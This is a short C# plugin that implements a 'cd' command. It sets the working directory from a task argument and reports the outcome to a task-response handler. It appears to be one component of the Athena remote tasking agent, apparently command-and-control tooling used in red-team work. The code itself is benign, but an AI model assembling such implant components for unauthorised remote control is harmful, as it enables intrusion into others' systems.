using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection.Metadata.Ecma335;
using Athena.Commands;
using Athena.Commands.Models;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class Cd : IPlugin
    {
        public string Name => "cd";

        public bool Interactive => false;

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }

        public void Start(Dictionary<string, string> args)
        {
            try
            {
                if (args.ContainsKey("path") && !string.IsNullOrEmpty(args["path"]))
                {
                    string path = (args["path"]).Replace("\"", "");

                    Directory.SetCurrentDirectory(path);

                    TaskResponseHandler.Write($"Changed directory to {Directory.GetCurrentDirectory()}", args["task-id"], true);
                }
                else
                {
                    TaskResponseHandler.Write("Missing path parameter", args["task-id"], true, "error");
                }
            }
            catch (Exception e)
            {
                TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
            }
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }
    }
}
